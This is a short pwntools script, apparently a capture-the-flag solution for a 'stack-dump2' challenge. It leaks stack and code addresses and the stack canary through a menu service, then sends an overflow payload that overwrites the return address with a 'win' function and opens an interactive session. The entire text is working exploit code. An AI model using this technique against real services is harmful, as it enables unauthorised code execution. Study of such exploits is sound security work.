
from pwn import *

# context.log_level = 'debug'

# p = process('./stack-dump2')
p = remote("plzpwn.me","5000")
p.recvuntil("stack pointer ")
useful = p.recv(10)
p.recv()
p.sendline('c')
seg = p.recvuntil("-")[:-1]
win = int(seg, 16) + 1901
p.recv()
p.sendline('a')
p.recv()
p.sendline('5')
sent = (int(useful,16)  + 0x71 - 0x8)
p.sendline(p32(sent))
p.recv()
p.sendline('b')
p.recvuntil(": ")
canary = p.recv(4)
p.sendline('a')
p.recv()
attack = '0AAA' + 'A'*92 + canary + p32(win)*3
p.sendline(str(len(attack)+1))
p.sendline(attack)
p.recv()
p.sendline('d')
p.interactive()
